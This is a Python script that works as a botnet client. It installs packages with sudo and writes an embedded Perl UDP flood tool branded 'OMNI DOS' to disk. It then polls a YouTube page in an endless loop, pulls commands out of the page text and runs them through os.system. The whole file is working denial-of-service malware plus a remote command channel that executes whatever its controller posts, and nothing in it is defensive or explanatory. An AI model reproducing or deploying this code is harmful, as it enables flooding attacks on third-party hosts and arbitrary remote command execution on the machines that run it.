import os


os.system("sudo yum install python-requests -y")
os.system("sudo yum install python-pathlib -y")
os.system("sudo pip3 install requests")
os.system("sudo pip3 install time")
os.system("sudo pip3 install path")
os.system("sudo pip3 install pathlib")
os.system("sudo pip3 install pathlib2")
import requests
import time
from pathlib import Path
file = '''
#!/usr/bin/perl

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;


use Socket;
use strict;

my ($ip,$port,$size,$time) = @ARGV;

my ($iaddr,$endtime,$psize,$pport);

$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n Usage: IP Port PacketSize Time\n Ex: 1.1.1.1 80 65500 300";
$endtime = time() + ($time ? $time : 100);
socket(flood, PF_INET, SOCK_DGRAM, 17);

print BOLD RED<<EOTEXT;







             O M N I   D O S
                                                  
		   Made By OmniPhantom








EOTEXT

print "Slamming $ip " . ($port ? $port : "random") . " port with " . 
  ($size ? "$size-byte" : "random size") . " packets" . 
  ($time ? " for $time seconds" : "") . "\n";
print "Stop Stress Test With Ctrl-C\n" unless $time;
 
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(1024-64)+64) ;
  $pport = $port ? $port : int(rand(65500))+1;
 
  send(flood, pack("a$psize","flood"), 0, pack_sockaddr_in($pport, $iaddr));}
'''
file.encode('utf-8')
my_file = Path("flood.pl")
if my_file.is_file():
    hi = "hi"
else:
    with open('flood.pl', 'w') as f:
        f.write(file)


while True:
    string = requests.get("https://www.youtube.com/watch?v=jZ8WVPoioVw").text
    value = string.split('ejgoindikgogfjjh')
    command = value[1] + " " + value[2] + " " + value[3] + " " + value[4] + " " + value[5] + " " + value[6]
    print(command)
    if value[1] == "wait":
        print("Command Is To Wait, Waiting 10 Seconds")
        time.sleep(10)
    else:
        os.system(command)
